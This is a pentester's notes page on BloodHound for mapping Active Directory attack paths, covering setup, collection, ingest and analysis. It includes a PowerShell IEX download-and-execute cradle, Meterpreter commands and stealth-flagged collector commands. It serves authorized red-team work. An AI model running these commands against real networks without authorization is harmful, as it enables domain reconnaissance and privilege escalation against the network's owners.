# [BloodHound](https://github.com/BloodHoundAD/BloodHound)

> BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment.

---

## Setup

**Attack machine**: [[neo4j#Run via Docker|Start Neo4j]]

**Attack machine (must be GUI)**: Start Bloodhound

```bash
cd /opt/bloodhound/BloodHound-linux-x64
./BloodHound --no-sandbox # no sudo required
```

Login using your neo4j credentials (in LastPass).

---

## Collection

Somehow, someway, execute a BloodHound collector (located in **/opt/bloodhound/collectors**), either from the attacker's machine with domain user credentials or on a domain-joined machine.

**Attacker Machine, Python collector**:

```bash
bloodhound-python -d $DOMAIN -u $USERNAME -p $PASSWORD -c All -ns $DOMAIN_DNS_SERVER_IP
```

**Target Machine, PowerShell collector**:

Source the BloodHound collector script.

```powershell
. .\SharpHound.ps1 # Locally
IEX (New-Object Net.Webclient).DownloadString("$HTTP_URL_TO_SCRIPT"); $BLOODHOUND_COMMAND_HERE # Remotely
```

Execute the collector script.

```powershell
Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth -NoSaveCache -CompressData # HYDRA.test
```

**Target Machine, C# Collector**:

```powershell
.\SharpHound.exe --CollectionMethod All --Domain $DOMAIN --Stealth --NoSaveCache --CompressData # HYDRA.test
```

**Meterpreter/PowerShell on Target Machine**:

```powershell
meterpreter > use powershell
meterpreter > powershell_import $PATH_TO_SHARPHOUND_PS1
meterpreter > powershell_execute "Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth -NoSaveCache -CompressData" # HYDRA.test
```

---

## Ingest

Transfer the resultant ZIP archive to the attacker machine upload it to the BloodHound web UI, and explore!

---

## Analysis Process

After you've ingested all of the data, go to the search bar, type in the name of the principal you've already compromised, and hit enter. Right-click the resultant node and select `Mark Principal as Owned`. Do this for each principal you've compromised.

Afterwards, go through each of the prebuilt analytic queries except for `Shortest Paths to High Value Targets`.

If nothing stands out, select the query `Shortest Paths to High Value Targets` and see if there's anything interesting.

Afterwards, search for each of the owned principals. Right-click the node and investigate the `Node Info` attributes. Pay special attention to `Outbound Control Objects`.

---

## Discover Kerberoastable Users

Use the prebuilt query `List all Kerberoastable Users`.
